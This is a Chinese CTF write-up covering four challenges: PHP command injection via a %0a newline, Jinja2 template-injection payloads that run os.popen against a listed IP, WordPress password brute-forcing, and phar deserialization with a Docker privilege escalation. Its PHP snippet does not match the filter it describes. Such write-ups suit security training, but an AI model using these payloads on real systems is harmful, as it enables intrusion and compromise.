### 代码审计与漏洞利用

#### 示例1：命令注入绕过过滤

**问题描述**

在以下PHP代码中，`ip`变量存在注入风险。尽管对`ip`进行了特殊字符和字母的过滤，但由于使用了`shell_exec`函数，并且正则表达式并未完全阻止所有可能的注入方式，因此可以使用换行符（例如`%0a`）进行截断以绕过限制。

```php
echo $result;
$result = str_replace("n", "", $result);
echo $result;
```

**攻击向量**

通过构造如下请求，可成功执行命令读取服务器上的`flag.php`文件内容：

```
?ip=127.0.0.1 %0acat flag.php
```

**输出结果**

```
flag{6Zi/5qOu5LiK5LqG6Zi_5biF77yM5Zyo5LiA5Liq5rKh5py_J5pif5pif55qE5aSc5pma}
```

---

### Web安全挑战

#### 挑战1：Jinja2模板注入

**考点说明**

此题目考察Python Flask框架下Jinja2模板引擎的注入漏洞。给定的应用程序没有对用户输入做适当过滤，导致可以直接构造恶意Payload执行任意命令。

**攻击方法**

发送如下HTTP请求即可触发RCE并读取目标文件内容：

```
http://101.201.126.95:7050/{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /usr/src/app/flog').read()") }}{% endif %}{% endfor %}
```

或者更简洁地：

```
http://101.201.126.95:7050/{{ config.__class__.__init__.__globals__['os'].popen('cat flog').read() }}
```

**源码分析**

- `index.py`: 使用Flask创建Web服务。
- `/`路由返回静态文本。
- `404`错误处理器尝试渲染包含原始URL字符串的模板。

---

#### 挑战2：WordPress渗透测试

**初步侦察**

- 利用`wpscan`工具扫描目标站点获取基本信息如版本号、插件列表等。
- 发现当前安装的是WordPress 5.4.1版本及默认主题Twenty Seventeen。
- 确认存在两个用户账户：`admin` 和 `jerry`。

**暴力破解**

- 生成密码字典后尝试登录后台管理系统。
- 成功获取用户名为`jerry`的有效凭证：`Password: egIsNNNnotHe`。

**进一步操作**

- 登录WP管理界面寻找敏感信息或配置文件。
- 最终找到FLAG：`flag{wEak_pAsS_1s_deNge20us}`。

---

#### 挑战3：Phar反序列化与Docker提权

**环境概述**

- 提供了一个上传功能受限于仅允许`.gif`格式图片的网站。
- 通过泄露的源代码发现潜在的安全弱点。

**利用过程**

- 制作一个特殊的`.phar`文件并通过修改扩展名绕过类型检查。
- 在Docker环境中启动具有高权限的容器来访问主机资源。
- 修改系统关键文件实现提权并最终获取FLAG：`flag{Nobody_knows_Hackuoer_better_than_me}`。

---

### 总结

这些案例展示了多种常见的Web应用安全问题及其解决方案。对于初学者而言，参与此类竞赛能够极大地提升个人技能水平；而对于经验丰富的开发者来说，则是检验自身知识体系完整性的良好机会。